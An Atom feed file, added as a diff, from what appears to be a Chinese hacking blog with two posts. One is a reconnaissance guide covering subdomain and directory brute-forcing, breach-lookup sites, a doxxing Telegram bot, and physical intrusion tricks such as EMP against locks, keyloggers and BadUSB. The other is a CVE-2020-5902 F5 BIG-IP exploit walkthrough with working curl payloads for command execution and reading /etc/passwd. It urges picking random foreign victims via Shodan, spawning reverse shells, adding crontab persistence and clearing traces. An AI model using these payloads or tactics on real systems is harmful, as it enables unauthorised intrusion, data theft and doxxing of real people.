@@ -1,0 +1,443 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://m0sway.github.io</id>
+    <title>m0sway</title>
+    <updated>2020-07-27T08:12:52.900Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://m0sway.github.io"/>
+    <link rel="self" href="https://m0sway.github.io/atom.xml"/>
+    <subtitle>每道伤口的背后.有多少的回忆痛到窒息.</subtitle>
+    <logo>https://m0sway.github.io/images/avatar.png</logo>
+    <icon>https://m0sway.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2020, m0sway</rights>
+    <entry>
+        <title type="html"><![CDATA[信息收集系统篇]]></title>
+        <id>https://m0sway.github.io/post/xin-xi-shou-ji-zong-jie-pian-bu-ding-qi-geng-xin/</id>
+        <link href="https://m0sway.github.io/post/xin-xi-shou-ji-zong-jie-pian-bu-ding-qi-geng-xin/">
+        </link>
+        <updated>2020-07-18T06:29:59.000Z</updated>
+        <content type="html"><![CDATA[<ol>
+<li>
+<p>whois信息<br>
+whois信息可以获取关键注册人的信息，包括注册商、所有者、所有者联系邮箱、联系电话、域名注册时间、域名到期时间、域名状态、DNS服务器等。<br>
+<code>http://whois.chinaz.com/ https://whois.aliyun.com/</code><br>
+各大注册商以及第三方站长工具的域名WHOIS信息查询地址如下：</p>
+<pre><code> 中国万网域名WHOIS信息查询地址：https://whois.aliyun.com/
+
+ 西部数码域名WHOIS信息查询地址：https://whois.west.cn/
+
+ 新网域名WHOIS信息查询地址：http://whois.xinnet.com/domain/whois/index.jsp
+
+ 纳网域名WHOIS信息查询地址：http://whois.nawang.cn/
+
+ 中资源域名WHOIS信息查询地址：https://www.zzy.cn/domain/whois.html
+
+ 三五互联域名WHOIS信息查询地址：https://cp.35.com/chinese/whois.php
+
+ 新网互联域名WHOIS信息查询地址：http://www.dns.com.cn/show/domain/whois/index.do
+
+ 美橙互联域名WHOIS信息查询地址：https://whois.cndns.com/
+
+ 爱名网域名WHOIS信息查询地址：https://www.22.cn/domain/
+
+ 易名网域名WHOIS信息查询地址：https://whois.ename.net/
+
+ 下面是站长工具类第三方查询地址(部分网站注册人信息会隐藏或提示联系域名注册商获取，可以去who.is查询看看)
+
+ Kali的查询：whois -h 注册服务器地址  域名
+
+ 站长工具-站长之家域名WHOIS信息查询地址：http://whois.chinaz.com/
+
+ 爱站网域名WHOIS信息查询地址：https://whois.aizhan.com/
+
+ 腾讯云域名WHOIS信息查询地址：https://whois.cloud.tencent.com/
+
+ 国外的who.is：https://who.is/ 
+
+ 微步：https://x.threatbook.cn/ 
+
+ Virus Total:https://www.virustotal.com
+
+ 还有Kali中自带的whois查询、一些集成工具等。
+</code></pre>
+<p>备案信息查询</p>
+<pre><code> 天眼查：https://www.tianyancha.com/ 
+
+ ICP备案查询网：http://www.beianbeian.com/ 
+
+ 国家企业信用信息公示系统：http://www.gsxt.gov.cn/index.html
+
+ 爱站的备案查询：https://icp.aizhan.com
+</code></pre>
+</li>
+<li>
+<p>web指纹识别<br>
+获取系统、中间件及其他插件信息。<br>
+根据经验判断：</p>
+<pre><code>Windows系统（IIS等环境）一般不区分URL中的大小写；Linux系统（Apache、tomcat、nginx等环境）严格区分URL中的大小写。
+</code></pre>
+<p>浏览器插件插件:<br>
+<code>Wapplyzer插件</code><br>
+web报错信息<br>
+未做处理的web报错信息如：400、500等可能会包含中间件版本信息、网站绝对路径等信息.<br>
+报错手段：</p>
+<pre><code> 1. 利用不完整的URL。
+ 2. 添加特殊字符的URL。
+ 3. POST data中添加特殊字符。
+ 4. 修改request数据包中参数的值，添加垃圾数据等。
+</code></pre>
+<p>在线工具:</p>
+<pre><code> http://whatweb.bugscaner.com/look/ 在线指纹识别
+ https://scan.top15.cn/web/   ThreatScan基础信息查询
+ http://www.yunsee.cn/ 云悉
+ fofa、zoomeye、shodan 都可以搜索参考。
+</code></pre>
+</li>
+<li>
+<p>waf识别<br>
+wafw00f</p>
+<pre><code>项目地址：
+https://github.com/EnableSecurity/wafw00f
+使用方式：
+wafw00f [目标]
+</code></pre>
+</li>
+<li>
+<p>获取真实IP<br>
+本地ping:<br>
+<code>ping xxx.com 而不是 ping www.xxx.com （现有很多CDN厂商基本只要求把www.xxx.com cname到cdn主服务器上去）</code><br>
+全球Ping检测:</p>
+<pre><code>http://ping.chinaz.com/
+https://www.wepcc.com/
+</code></pre>
+<p>fofa、zoomeye、shodan搜索:</p>
+<pre><code>https://fofa.so/ （国内推荐）
+https://www.zoomeye.org/ （国内推荐）
+https://www.shodan.io/ （国外推荐）
+查看域名对应的历史端口和服务找出可疑的IP，再结合ip域名反查（https://dns.aizhan.com/）来确定真实IP。
+</code></pre>
+<p>IP反查在线工具:</p>
+<pre><code>https://dns.aizhan.com/
+http://tool.chinaz.com/
+http://site.ip138.com/
+https://phpinfo.me/bing.php
+</code></pre>
+<p>查询网:<br>
+<code>https://site.ip138.com/</code><br>
+通过国外DNS:</p>
+<pre><code>nslookup xxx.com 8.8.8.8
+在线查询：
+https://webiplookup.com/
+</code></pre>
+<p>历史纪录寻找真实IP（需要翻墙）:<br>
+<code>http://toolbar.netcraft.com/site_report?url=www.xxx.com</code><br>
+其他方式：</p>
+<pre><code>1. github泄露
+2. 如果目标站点有自己的APP，通过抓取APP请求来获取ip
+3. 利用发送邮件功能
+4. rss 订阅链接
+</code></pre>
+</li>
+<li>
+<p>获取端口服务信息</p>
+<pre><code>Nmap安装与使用方法可参考：
+https://blog.csdn.net/m1585761297/article/details/80015726
+https://www.cnblogs.com/weihua2616/p/6599629.html
+</code></pre>
+<p>在线端口扫描<br>
+http://old.tool.chinaz.com/port/<br>
+http://coolaf.com/tool/port<br>
+https://scan.top15.cn/web/portscan</p>
+</li>
+<li>
+<p>子域名信息收集<br>
+通过搜索引擎搜索<br>
+手动搜索（百度、Google）:<br>
+<code>site:*.xxx.com</code></p>
+<p>工具搜索</p>
+<pre><code> 项目地址https://github.com/laramies/theHarvester
+使用：
+python3 theHarvester.py -d qq.com -l 200 -b baidu,bing,google //-d 目标 -l多少条 -b搜索引擎 
+</code></pre>
+<p>第三方聚合应用枚举：</p>
+<pre><code>1) VirusTotal：https://www.virustotal.com/#/home/search
+2) DNSdumpster：https://dnsdumpster.com/ 
+</code></pre>
+<p>SSL证书查询：<br>
+SSL/TLS证书通常包含域名、子域名和邮件地址，这些是我们需要获取的信息，通常CT是CA的一个项目，CA会把每个SSL/TLS证书发布到公共日志中，查找域名所属证书的最简单方法就是使用搜索引擎搜索一些公开CT日志。</p>
+<p>主要网站如下：</p>
+<pre><code>1) https://crt.sh/
+
+2) https://censys.io/
+
+3) https://developers.facebook.com/tools/ct/
+
+4) https://google.com/transparencyreport/https/ct/
+</code></pre>
+<p>在线网站查询：</p>
+<pre><code>1) http://dns.aizhan.com
+
+2) http://z.zcjun.com/（响应很快,推荐）
+</code></pre>
+<p>子域名枚举<br>
+subDomainsBrute</p>
+<pre><code>作用：高并发DNS暴力枚举，发现其他工具无法探测到的域名, 如Google，aizhan，fofa。
+
+工具地址：
+https://github.com/lijiejie/subDomainsBrute
+
+依赖安装
+pip install dnspython gevent
+
+工具使用
+subDomainsBrute.py [options] target.com
+</code></pre>
+<p>wydomain</p>
+<pre><code>项目地址：
+https://github.com/ring04h/wydomain
+
+工具使用
+python wydomain.py -d XX.com -o mi.txt
+python dnsburte.py -d XX.com -f dnspod.csv -o XX_burp.txt
+#.zshrc已定义输入domain 查看使用方式
+</code></pre>
+<p>Layer子域名挖掘机</p>
+<pre><code>链接:https://pan.baidu.com/s/1lTxKmz6sYUFcTG_eyAqCjA  密码:dh7s
+</code></pre>
+</li>
+<li>
+<p>目录及文件信息</p>
+<p>字典库:</p>
+<pre><code>https://github.com/TheKingOfDuck/fuzzDicts 在更新
+https://github.com/k8gege/PasswordDic 在更新
+https://github.com/rootphantomer/Blasting_dictionary 已停止更新
+</code></pre>
+<p>暴力扫描目录和文件的工具<br>
+dirmap</p>
+<pre><code>项目地址：
+https://github.com/H4ckForJob/dirmap/
+使用方式：
+结果输出位置工具目录output文件夹中
+
+单个目标，默认为http
+python3 dirmap.py -i https://target.com -lcf
+python3 dirmap.py -i 192.168.1.1 -lcf
+
+子网（CIDR格式）
+python3 dirmap.py -i 192.168.1.0/24 -lcf
+
+网络范围
+python3 dirmap.py -i 192.168.1.1-192.168.1.100 -lcf
+
+文件读取
+python3 dirmap.py -iF targets.txt -lcf
+</code></pre>
+<p>dirsearch</p>
+<pre><code>项目地址：
+https://github.com/maurosoria/dirsearch
+
+使用方式：
+python3 dirsearch.py -u http://eye.bjjtw.gov.cn:8081 -e asp
+
+python3 dirsearch.py -t 10 --timeout=3 -x 999,202,502,401,503,404,403,405,500,505,400 -L ./url.txt -e * -w
+//-t 线程；-x 排除指定返回状态值的页面；-L 读取目标url文件；-e 指定字典地址；-w 
+
+指定字典扫描：
+python3 dirsearch.py -u http://www.xxx.com -e /xx/xx/dir.txt
+</code></pre>
+<p>windows工具-SWebScan</p>
+<pre><code>https://github.com/shack2/SWebScan/releases
+</code></pre>
+<p>git/svn信息泄露<br>
+目录扫描工具能够扫描出.svn或者.git的目录，运用下面的工具进行利用。</p>
+<pre><code>svn-extractor
+
+项目地址：
+https://github.com/anantshri/svn-extractor
+使用方式：
+svn-extractor.py --url“具有.svn的网址”
+
+GitHack
+
+项目地址：
+https://github.com/BugScanTeam/GitHack
+使用方式：
+python GitHack.py http://www.openssl.org/.git/
+
+Seay-Svn
+
+windows工具：
+Seay-Svn.rar 输入具有.svn的网址（下载地址：链接:https://pan.baidu.com/s/1Hc2xENcCfNcT59kaUXMaLg  密码:wdls）
+
+目录结构信息
+
+burpsuite被动扫描
+awvs目录结构扫描
+</code></pre>
+</li>
+<li>
+<p>JS文件信息收集<br>
+JSFinder</p>
+<pre><code>项目地址：https://github.com/Threezh1/JSFinder
+
+简单爬取：
+python3 JSFinder.py -u https://www.jd.com/
+
+-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名：
+python3 JSFinder.py -u https://www.jd.com/ -d -ou jd_url.txt -os jd_domain.txt
+
+指定URL：
+python JSFinder.py -f text.txt
+
+指定JS：
+python JSFinder.py -f text.txt -j
+</code></pre>
+</li>
+<li>
+<p>C段及旁站信息收集<br>
+C段:</p>
+<pre><code>http://www.webscan.cc/
+
+https://phpinfo.me/bing.php（可能访问不了）
+
+神器：https://github.com/robertdavidgraham/masscan
+
+御剑1.5：https://download.csdn.net/download/peng119925/10722958
+
+C端查询：IIS PUT Scanner（扫描速度快，自定义端口，有banner信息）
+</code></pre>
+<p>旁站查询（同ip网站查询、反查）</p>
+<pre><code>https://scan.top15.cn/web/webside
+https://dns.aizhan.com/
+</code></pre>
+</li>
+<li>
+<p>社工<br>
+利用邮箱、手机查询注册过的网站</p>
+<pre><code>https://www.reg007.com/ 国内
+https://namechk.com/ 国外
+综合性信息情报搜索（需要翻墙）
+https://www.osint-labs.org/search/index.php
+</code></pre>
+<p>社工库</p>
+<pre><code>http://site3.sjk.space
+https://haveibeenpwned.com/
+27017/27018 服务：mongodb     总结：未授权访问/爆破
+</code></pre>
+<p>Telegram社工机器人<br>
+目前可用的社工查询机器人，需要自己翻墙创建Telegram账号。<br>
+https://t.me/sgk123bot</p>
+</li>
+<li>
+<p>近源信息收集</p>
+<ol>
+<li>
+<p>外接无线网卡主要是用来配合kali破解无线密码的，现在一般是通过抓握手包然后跑包来破解，还可以通过伪造SSID钓鱼、中间人攻击等等，主要是获取无线网密码、网段信息等。</p>
+</li>
+<li>
+<p>大菠萝可以捕获握手包并模仿目标AP。大菠萝可以完全模仿首选网络，从而实现中间人攻击，获取我们想要的无线网信息，为攻击目标系统收集信息。</p>
+</li>
+<li>
+<p>当前电子设备和电路的工作频率不断提高，而工作电压却逐渐降低，因此对电磁脉冲（EMP）的敏感性和易损性也不断增加。同时，电子系统中的集成电路对电磁脉冲比较敏感，往往一个较大的电磁脉冲，就会使集成块产生误码、甚至电子元器件失效或烧毁，所以我们可以使用EMP干扰来打开部分电子门禁和电子密码锁。如果我们使用EMP无法打开门禁，那我们还有一个方法，但是需要我们稍微靠近一下目标，找合适的机会破解IC卡，或复制ID卡。进而突破门禁，实现物理攻击和信息收集。</p>
+</li>
+<li>
+<p>当然我们也可由通过社工获取指纹信息，拓印出一个跟原指纹一模一样的指纹膜突破物理门禁、办公PC指纹识别等。</p>
+</li>
+<li>
+<p>如果你能接触到目标主机，那你就可以将键盘记录器接入到主机和键盘之间，并配置连接WI-FI，将键盘敲击的数据实时传回远程服务器。</p>
+</li>
+<li>
+<p>进入办公地点或者内网之后，可以在内网偷偷装一个PacketSquirrel，作为中间人攻击工具，PacketSquirrel可以捕获网络端点的数据包、并且可以使用VPN和反向shell获得远程访问权限，为攻击目标系统收集部分信息。</p>
+</li>
+<li>
+<p>badusb是HID（人机接口）攻击的一种，也称为热插拔攻击。想象一下，你可以走到一台计算机上，插入看似无害的USB驱动器，然后安装后门，窃听文档，窃取相关密码.，收集目标系统相关信息。</p>
+</li>
+</ol>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[F5 BIG-IP RCE漏洞（CVSS 10）复现]]></title>
+        <id>https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/</id>
+        <link href="https://m0sway.github.io/post/f5-big-ip-rce-lou-dong-cvss-10fu-xian/">
+        </link>
+        <updated>2020-07-08T01:21:55.000Z</updated>
+        <content type="html"><![CDATA[<p>##简介<br>
+F5 BIG-IP 是美国``F5公司一款集成流量管理、DNS、出入站规则、web应用防火墙、web网关、负载均衡等功能的应用交付平台。<br>
+CVE编号：CVE-2020-5902</p>
+<p>##0x01 漏洞描述<br>
+在 F5 BIG-IP 产品的流量管理用户页面 (TMUI)/配置程序的特定页面中存在一处远程代码执行漏洞。<br>
+导致未授权攻击者可以执行任意命令(弹个shell啥的😋)</p>
+<p>##0x02 影响版本</p>
+<p>BIG-IP 15.x: 15.1.0/15.0.0</p>
+<p>BIG-IP 14.x: 14.1.0 ~ 14.1.2</p>
+<p>BIG-IP 13.x: 13.1.0 ~ 13.1.3</p>
+<p>BIG-IP 12.x: 12.1.0 ~ 12.1.5</p>
+<p>BIG-IP 11.x: 11.6.1 ~ 11.6.5</p>
+<p>##0x03 漏洞验证<br>
+emmmm 首先去shodan上任意寻找一个受害者(别是国内的就行)</p>
+<pre><code>shodan
+http.favicon.hash:-335242539
+http.title:&quot;BIG-IP&amp;reg;- Redirect&quot;
+
+fofa
+title=&quot;BIG-IP&amp;reg;- Redirect&quot;
+
+censys
+443.https.get.body_sha256:5d78eb6fa93b995f9a39f90b6fb32f016e80dbcda8eb&gt;71a17994678692585ee5
+443.https.get.title:&quot;BIG-IP&amp;reg;- Redirect&quot;
+
+google
+inurl:&quot;tmui/login.jsp&quot;
+intitle:&quot;BIG-IP&quot; inurl:&quot;tmui&quot;
+</code></pre>
+<p>####开搞<br>
+(截图随便截的，凑活看看吧)<br>
+github上面已经公布的poc</p>
+<pre><code>RCE: 
+   curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb /workspace/tmshCmd.jsp?command=list+auth+user+admin'
+
+Read File: 
+   curl -v -k  'https://[F5 Host]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' 
+</code></pre>
+<p>其中<code>list+auth+user+admin</code>这个命令是F5设备的命令，查看管理员权限的用户，如想查看所有用户可以使用<code>list+auth+user</code>来查看(+是连接符，在url中就是空格的含义，不用管它)<br>
+如下图所示：<br>
+<img src="https://m0sway.github.io/post-images/1595831143006.png" alt="" loading="lazy"></p>
+<p>到这里为止，已经验证了，确实能够执行远程命令和远程读取任意文件，但是给出的poc中能执行的只有F5设备的命令，并不能执行例如<code>ls、whoami、pwd</code>等常用的bash命令。<br>
+于是我们需要稍加改造。</p>
+<ul>
+<li>1.修改alias ，将list设置成bash命令</li>
+</ul>
+<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash
+</code></pre>
+<ul>
+<li>2.生成bash文件并写入要执行的命令</li>
+</ul>
+<pre><code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp
+POST:fileName=/tmp/m0sway&amp;content=whoami
+</code></pre>
+<ul>
+<li>
+<p>3.执行bash文件<br>
+<code>htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/m0sway</code></p>
+</li>
+<li>
+<p>4.还原alias设置，防止影响目标正常使用（切记一定要还原，不然无法使用正常的命令）<br>
+<code>https://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></p>
+</li>
+</ul>
+<p>Example:<br>
+<img src="https://m0sway.github.io/post-images/1595831292953.png" alt="" loading="lazy"></p>
+<p>这是命令成功执行后的回显，此处执行的是whoami命令</p>
+<figure data-type="image" tabindex="1"><img src="https://m0sway.github.io/post-images/1595831311709.png" alt="" loading="lazy"></figure>
+<p>能够执行命令之后，就是弹shell啦。<br>
+这里用python弹，F5设备都是自带python的，使用python弹方便些(用bash弹出来的shell隧道不稳定，容易断开)。<br>
+如果想研究研究F5设备可以在crontab里面弄一条定时任务弹shell.</p>
+<figure data-type="image" tabindex="2"><img src="https://m0sway.github.io/post-images/1595831332726.jpg" alt="" loading="lazy"></figure>
+<p>emmm 记得走之前清理下痕迹就好(我看了下tmp目录，好几个中国的反弹shell的IP，真的是能搞..不过有的应该是弹不出去的shell😇)<br>
+####POC<br>
+我这么懒，是吧？</p>
+]]></content>
+    </entry>
+</feed>
